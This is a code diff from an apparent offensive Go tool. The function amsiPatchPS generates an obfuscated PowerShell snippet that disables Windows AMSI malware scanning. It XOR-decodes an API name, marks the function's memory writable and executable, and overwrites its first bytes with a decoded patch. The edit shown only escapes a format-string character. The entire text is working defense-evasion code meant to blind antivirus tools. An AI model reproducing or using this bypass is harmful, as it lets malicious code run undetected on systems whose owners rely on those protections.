@@ -216,7 +216,7 @@ func amsiPatchPS() string {
 		`$_fb=[byte[]](` + fnBytes + `);$_fs='';for($_i=0;$_i -lt $_fb.Length;$_i++){$_fs+=[char]($_fb[$_i]-bxor$_k)};` +
 		`$_p=$W::GetProcAddress($W::LoadLibraryA($_ds),$_fs);` +
 		`$_o=[uint32]0;$W::VirtualProtect($_p,6,[uint32]0x40,[ref]$_o)|Out-Null;` +
-		`$_eb=[byte[]](` + encPatchStr + `);$_pb=[byte[]]($_eb|%{$_-bxor$_pk});` +
+		`$_eb=[byte[]](` + encPatchStr + `);$_pb=[byte[]]($_eb|%%{$_-bxor$_pk});` +
 		`[Runtime.InteropServices.Marshal]::Copy($_pb,0,$_p,6)`
 }
 
